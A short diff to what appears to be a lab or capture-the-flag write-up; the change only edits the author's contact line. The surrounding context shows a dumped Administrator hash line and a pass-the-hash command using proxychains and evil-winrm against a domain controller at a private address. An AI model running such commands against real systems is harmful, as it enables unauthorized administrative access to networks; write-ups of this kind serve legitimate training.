@@ -504,4 +504,4 @@ SMB 192.168.100.100 445 DC01 Administrator:500:aad3b435b51404eeaad3b435b51404ee:
 
 proxychains -q evil-winrm -u Administrator -H 'b4[...]85' -i 192.168.100.100
 ```
-Nice !! if u have any questions you can dm me on [Instagram](https://instagram.com/eliott.la) or on discord at 'ethicxz.'
+Nice !! If you have any questions you can dm me on discord : 'ethicxz.'
